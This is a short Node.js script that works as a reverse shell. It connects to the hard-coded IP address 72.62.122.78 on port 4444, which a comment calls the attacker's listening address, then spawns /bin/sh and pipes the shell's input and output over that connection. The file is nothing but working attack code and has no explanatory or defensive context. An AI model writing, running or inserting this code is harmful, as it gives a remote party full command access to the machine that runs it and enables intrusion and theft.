const { spawn } = require('child_process');
const net = require('net');

// The attacker's IP and the port they are listening on
const client = new net.Socket();
client.connect(4444, "72.62.122.78", () => {
    const sh = spawn('/bin/sh', []);
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
});
